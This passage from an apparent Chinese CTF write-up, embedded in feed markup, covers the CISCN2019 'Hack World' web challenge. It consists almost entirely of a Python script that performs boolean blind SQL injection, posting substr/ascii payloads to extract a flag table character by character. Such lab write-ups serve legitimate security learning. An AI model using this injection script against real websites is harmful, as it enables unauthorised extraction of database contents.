+<h2 id="例题-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#例题-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="例题:[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>例题:[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>写出python脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://df9ba400-06d5-4de6-bdd2-ee86a9a7a73e.node3.buuoj.cn/index.php'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">		payload = <span class="string">'0^(ascii(substr((select(flag)from(flag)),'</span> + str(i) + <span class="string">',1))&gt;'</span> + str(j) + <span class="string">')'</span></span><br><span class="line">		s = requests.post(url, data = &#123;<span class="string">'id'</span>:payload&#125;)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> s.text.find(<span class="string">'Error'</span>)&gt;<span class="number">0</span>:</span><br><span class="line">			flag += chr(j)</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
 
 ]]></content>
   </entry>
